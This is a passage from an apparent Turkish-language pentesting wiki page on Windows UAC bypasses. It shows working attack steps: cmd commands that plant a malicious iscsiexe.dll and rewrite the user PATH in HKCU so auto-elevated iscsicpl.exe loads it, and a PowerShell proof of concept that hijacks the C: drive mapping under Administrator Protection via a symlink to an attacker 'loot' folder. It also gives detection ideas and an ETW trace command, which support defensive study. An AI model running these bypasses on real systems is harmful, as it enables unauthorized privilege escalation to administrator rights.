2. Procmon ile **DLL Hijacking** için güvenlik açığı oluşturabilecek "**NAME NOT FOUND**" olaylarını bulun.
3. DLL'yi muhtemelen yazma izniniz olmayan bazı **korumalı yolların** (C:\Windows\System32 gibi) içine **yazmanız** gerekecek. Bunu şu yöntemlerle aşabilirsiniz:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, yüksek integrity level'da çalıştığı için bir CAB dosyasının içeriğini korumalı yollara çıkartabilir.
   2. **IFileOperation**: Windows 10.
4. DLL'nizi korumalı yola kopyalayan ve güvenlik açığı bulunan, autoelevated binary'yi çalıştıran bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bu yöntem, **autoElevated binary**'nin çalıştırılacak bir **binary**'nin veya **komutun** **adını/yolunu** **registry**'den **okumaya** çalışıp çalışmadığını izlemeyi içerir (binary bu bilgiyi **HKCU** içinden arıyorsa yöntem daha ilgi çekicidir).

### `SysWOW64\iscsicpl.exe` ve kullanıcı `PATH`'i üzerinden DLL hijacking ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, arama sırasını kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilecek, **auto-elevated** bir binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **kullanıcının yazabildiği** bir klasöre koyabilir ve ardından geçerli kullanıcının `PATH` değerini (örneğin `HKCU\Environment\Path` üzerinden) değiştirerek bu klasörün aranmasını sağlayabilirseniz, Windows saldırganın DLL'sini yükseltilmiş `iscsicpl.exe` process'i içinde **UAC istemi göstermeden** yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Uygulamaya yönelik notlar:
- Bu yöntem, geçerli kullanıcı **Administrators** grubunda olmasına rağmen UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
- Bu bypass için ilgili olan **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak ele alın ve davranışını bağımsız olarak doğrulayın.
- Bu yöntem **auto-elevation** ile **DLL search-order hijacking**'in birleşimidir. Bu nedenle, diğer UAC bypass'larında kullanılan ProcMon iş akışı eksik DLL yüklemesini doğrulamak için işe yarar.

En temel akış:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Algılama fikirleri:
- `reg add` / kayıt defteri yazma işlemlerinin hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasına yönelik uyarı oluşturun.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı denetimindeki** konumlarda `iscsiexe.dll` arayın.
- `iscsicpl.exe` başlatmalarını beklenmeyen alt süreçlerle veya normal Windows dizinlerinin dışından yapılan DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer yeni araştırmalar

2024 sonrası bazı zincirler artık klasik `HKCU\Software\Classes` kayıt defteri ele geçirmelerine benzemiyor. Örneğin, etkinleştirme bağlamı önbelleği zehirlemesi; `ctfmon.exe` gibi güvenilir UI / otomatik yükseltilen ikili dosyalar ve daha sonra `fodhelper.exe` gibi hedefler aracılığıyla bütünlük düzeyini orta seviyeden yükseğe çıkarmak için **sürücü eşlemesini değiştirme** ve **DLL yönlendirme** tekniklerini zincirleyebilir. Büyük PoC'yi burada yinelemek yerine şu konumdaki kısa payload örneklerini inceleyin:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Oturum başına DOS aygıt eşlemesi üzerinden Administrator Protection (önizleme) sürücü harfi ele geçirme

> [!NOTE]
> Ağustos 2026 itibarıyla Microsoft, Administrator Protection özelliğini hâlâ **Insider önizlemesi** olarak belgeliyor: Ekim 2025'teki dağıtım geri alındı ve daha sonraki bir tarihte yapılması planlanıyor. Bu zincirleri test etmeden önce **Admin Approval Mode with Administrator protection** özelliğinin gerçekten etkin olduğunu ve cihazın yeniden başlatıldığını doğrulayın; yalnızca stok 25H2 sürüm dizesi, özelliğin etkin olduğunu kanıtlamaz.<sup>[[10]](#references)</sup>

Windows 11 25H2 önizleme derlemelerindeki `RAiLaunchAdminProcess` / UIAccess saldırı yüzeyinin tamamı için özel sayfaya bakın:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, oturum başına `\Sessions\0\DosDevices/<LUID>` eşlemelerine sahip shadow-admin token'ları kullanır. Dizin, ilk `\??` çözümlemesinde `SeGetTokenDeviceMap` tarafından tembel olarak oluşturulur. Saldırgan, shadow-admin token'ını yalnızca **SecurityIdentification** düzeyinde taklit ederse dizin, saldırgan **sahip** olacak şekilde oluşturulur (`CREATOR OWNER` devralınır); böylece sürücü harfi bağlantıları `\GLOBAL??` konumundakilere öncelik kazanır.<sup>[[7]](#references)</sup>

**Adımlar:**

1. Düşük ayrıcalıklı bir oturumdan `RAiProcessRunOnce` çağırarak istem göstermeyen bir shadow-admin `runonce.exe` süreci başlatın.
2. Birincil token'ını bir **identification** token'ına çoğaltın ve saldırganın sahipliğinde `\Sessions\0\DosDevices/<LUID>` oluşturulmasını zorlamak için `\??` açılırken bu token'ı taklit edin.
3. Burada saldırganın denetimindeki depolamaya işaret eden bir `C:` symlink'i oluşturun; sonraki dosya sistemi erişimleri bu oturumda `C:` sürücüsünü saldırganın yoluna çözümler ve istem göstermeden DLL/dosya ele geçirmeyi mümkün kılar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Önizleme hostlarında Administrator Protection, onayları ve başarısızlıkları `Microsoft-Windows-LUA` sağlayıcısı altında **15031** ve **15032** ETW olayları olarak kaydeder. Olaylar, istekte bulunanın SID'sini, uygulama yolunu, sonucu, yönetilen yönetici hesabını ve kimlik doğrulama yöntemini içerir; bu nedenle tekrarlanan exploit girişimleri veya başarısız UI otomasyonu telemetri dışında kalmaz.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kullanıcı Hesabı Denetimi nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell arka kapıları oluşturmak için yapay zekâdan yararlanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya'daki kamu kurumlarını hedef alan 0-Day istismarı](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection'ı atlatma](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup görevini kullanarak UAC'yi atlatma](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip ve Narrator Always Notify bypass'ları](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Yönetici koruması](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET'ten yerel Windows RPC sunucularını çağırma](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte, CoolClient'ı imzalı bir Windows kernel rootkit'iyle geliştiriyor](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Casusluk, hırsızlık ve terör için tasarlanmış, tamamen tespit edilemeyen bir Windows trojan'ı](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
